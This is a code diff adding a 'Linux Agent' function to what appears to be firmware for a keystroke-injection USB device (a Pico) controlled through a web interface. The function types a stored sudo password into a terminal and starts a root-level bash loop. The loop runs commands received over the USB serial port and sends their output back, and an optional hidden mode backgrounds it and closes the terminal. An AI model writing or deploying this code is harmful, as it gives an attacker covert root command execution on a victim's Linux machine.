@@ -536,6 +536,72 @@ void handleExecuteCommand() {
 
 
 
+// ========================================================= Linux Agent ===================================================================
+
+
+void handleLinuxAgent() {
+    bool isHidden = fromMenu ? linuxAgentHiddenFlag : server.arg("hidden") == "1"; 
+    String password = server.arg("password");
+    if (password.length() == 0) {
+        File sudoFile = LittleFS.open("/sudo.txt", "r");
+        if (sudoFile) {
+            password = sudoFile.readStringUntil('\n');
+            sudoFile.close();
+        }else{
+          Serial.println("Error: Password not found!");
+          if (fromMenu){
+            fromMenu = false; 
+            return; 
+          }else{
+            server.send(500, "text/plain", "No password available!");
+            return;
+          }
+        }
+    } 
+    delay(1000);
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('t');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(500);
+
+    Keyboard.print("echo " + password + " | sudo -S ");
+    if (isHidden) {
+      Keyboard.print("nohup ");
+    }
+    Keyboard.print("bash -c 'BAUD_RATE=115200; VID=\"239a\"; PID=\"cafe\"; echo \"Searching for Pico with VID:$VID PID:$PID...\";");
+    Keyboard.print("if ! lsusb | grep -i \"${VID}:${PID}\" > /dev/null; then echo \"Pico not found!\"; exit 1; fi; echo \"Pico detected.\";");
+    Keyboard.print("DEVICE=$(ls -t /dev/ttyACM* 2>/dev/null | head -n 1); if [ -z \"$DEVICE\" ]; then echo \"No /dev/ttyACM* device found.\"; exit 1; fi; echo \"Using serial device: $DEVICE\";");
+    Keyboard.print("stty -F \"$DEVICE\" $BAUD_RATE cs8 -cstopb -parenb -icanon -echo;");
+    Keyboard.print("last_command=\"\"; while true; do if read -t 0.5 -r line < \"$DEVICE\"; then command=$(echo \"$line\" | xargs); if [ -n \"$command\" ] && [ \"$command\" != \"$last_command\" ]; then echo \"Received: $command\"; last_command=$command; output=$(bash -c \"$command\" 2>&1); response=\"${output:-[Command executed successfully, no output]}\"; echo \"Sending response...\"; echo \"$response\" > \"$DEVICE\"; sleep 0.1; fi; fi; sleep 0.2; done'");
+    if (isHidden) {
+      Keyboard.print(" > /dev/null 2>&1 &");
+    }
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
+    
+    delay(1000);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
+    delay(1000);
+    
+    Keyboard.print("exit");
+    delay(100);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
+    
+    if (fromMenu){
+      fromMenu = false;
+    }else{
+      server.send(200, "text/plain", "Linux Agent Deployed");
+    }
+}
+
+
 // =========================================================== Screenshot Page =================================================================
 
 String base64Image = "";  
